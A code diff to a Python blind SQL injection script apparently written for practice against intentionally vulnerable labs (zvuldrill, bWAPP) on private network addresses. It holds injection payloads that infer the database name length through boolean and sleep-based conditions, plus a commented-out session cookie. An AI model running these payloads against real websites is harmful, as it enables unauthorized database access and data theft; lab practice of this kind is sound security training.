@@ -8,7 +8,8 @@ from urllib import request
 # http://192.168.52.128/test2/zvuldrill-master/search.php?search=1%' or if((select length(database()))=9,1,0)%23
 #if(({sql}),sleep(2),0)
 
-def get_dblength(url='http://192.168.52.128/test2/zvuldrill-master/search.php?search=1',cookie=False,type='int'):
+#def get_dblength(url='http://192.168.52.128/test2/zvuldrill-master/search.php?search=1',cookie=False,type='search'):
+def get_dblength(url='http://172.30.61.112/zvuldrill-master/search.php?search=1',cookie=False,type='search'):
 
     if type == 'int':
         payload = '+or+if((select+length(database()))={database_length},1,0)'
@@ -39,5 +40,5 @@ def get_dblength(url='http://192.168.52.128/test2/zvuldrill-master/search.php?se
 if __name__ == "__main__":
         url1='http://192.168.52.128/test2/zvuldrill-master/search.php?search=1'
         url2='http://192.168.52.128/bWAPP/bWAPP/sqli_2.php?action=go&movie=100'
-        # get_dblength(url1,type='search')
-        get_dblength(url2,cookie='security_level=0;PHPSESSID=r2rn1sttfeldh3iutamthqduu3',type='int')
+        get_dblength()
+        #(url2,cookie='security_level=0;PHPSESSID=r2rn1sttfeldh3iutamthqduu3',type='int')
